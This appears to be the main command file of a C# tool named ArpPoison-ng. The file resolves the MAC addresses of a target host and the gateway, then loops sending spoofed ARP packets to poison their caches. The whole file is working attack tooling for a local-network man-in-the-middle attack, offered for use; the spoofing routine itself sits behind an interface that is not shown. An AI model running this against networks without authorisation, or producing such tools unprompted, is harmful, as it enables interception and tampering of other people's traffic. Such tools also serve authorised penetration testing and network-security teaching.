using ArpPoison_ng.Interfaces;
using Spectre.Console.Cli;
using System;
using SharpPcap;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ArpPoison_ng.Commands
{
    public class StartCommand : AsyncCommand<StartCommand.Settings>
    {
        private readonly IConsoleUI _consoleUI;
        private readonly INetworkDeviceProvider _networkDeviceProvider;
        private readonly IPacketBuild _packetBuild;
        private readonly IArpPoison _arpPoison;
        public StartCommand(IConsoleUI consoleUI, INetworkDeviceProvider networkDeviceProvider, IPacketBuild packetBuild, IArpPoison arpPoison)
        {
            _consoleUI = consoleUI;
            _networkDeviceProvider = networkDeviceProvider;
            _packetBuild = packetBuild;
            _arpPoison = arpPoison;
        }
        public override async Task<int> ExecuteAsync(CommandContext context, Settings settings, CancellationToken cancellationToken)
        {
            _consoleUI.ShowBanner("ArpPoison-ng");

            _consoleUI.WriteLine($"Opening device '{settings.Interface}'...");
            SharpPcap.ILiveDevice device;
            try
            {
                device = _networkDeviceProvider.OpenDeviceByName(settings.Interface);
            }
            catch (Exception ex)
            {
                _consoleUI.WriteLine($"Failed to open device '{settings.Interface}': {ex.GetBaseException().Message}");
                return 1;
            }

            _consoleUI.WriteLine($"Opened device => {device.Name}");

            var gatewayIp = _networkDeviceProvider.GetGatewayAddress();
            if (gatewayIp == null)
            {
                _consoleUI.WriteLine("Gateway IP not found. Aborting.");
                return 1;
            }

            _consoleUI.WriteLine($"Gateway IP: {gatewayIp}");

            string targetMacStr;
            string gatewayMacStr;
            try
            {
                _consoleUI.WriteLine($"Resolving MAC for target {settings.Target}...");
                targetMacStr = await _packetBuild.GetMacAddress(device, settings.Target);
                _consoleUI.WriteLine($"Resolved target MAC: {targetMacStr}");

                _consoleUI.WriteLine($"Resolving MAC for gateway {gatewayIp}...");
                gatewayMacStr = await _packetBuild.GetMacAddress(device, gatewayIp.ToString());
                _consoleUI.WriteLine($"Resolved gateway MAC: {gatewayMacStr}");
            }
            catch (OperationCanceledException)
            {
                _consoleUI.WriteLine("Operation cancelled while resolving MAC addresses.");
                return 1;
            }
            catch (Exception ex)
            {
                _consoleUI.WriteLine($"Failed to resolve MAC addresses: {ex.GetBaseException().Message}");
                return 1;
            }

            try
            {
                PhysicalAddress.Parse(targetMacStr);
                PhysicalAddress.Parse(gatewayMacStr);
            }
            catch (Exception ex)
            {
                _consoleUI.WriteLine($"Invalid MAC address format: {ex.GetBaseException().Message}");
                return 1;
            }

            _consoleUI.WriteLine("Starting ARP spoofing loop. Press Ctrl+C to stop.");

            try
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    _consoleUI.WriteLine($"Sending spoofed ARP to target {settings.Target} and gateway {gatewayIp}...");
                    try
                    {
                        _arpPoison.Spoof(device, settings.Target, gatewayIp.ToString(), targetMacStr, gatewayMacStr);
                        _consoleUI.WriteLine($"Sent spoofed ARP to target {settings.Target}");
                    }
                    catch (Exception ex)
                    {
                        _consoleUI.WriteLine($"Error sending spoofed ARP: {ex.GetBaseException().Message}");
                    }

                    await Task.Delay(1000, cancellationToken);
                }
            }
            catch (OperationCanceledException)
            {
                _consoleUI.WriteLine("Spoofing cancelled.");
            }

            _consoleUI.WriteLine("Exiting.");
            return 0;
        }

        public sealed class Settings : CommandSettings
        {
            [CommandOption("-i|--interface <INTERFACE>", true)]
            [Description("The network interface to use for ARP poisoning.")]
            public required string Interface { get; set; }

            [CommandOption("-t|--target <TARGET>", true)]
            [Description("The target IP address to poison.")]
            public required string Target { get; set; }
        }
    }
}
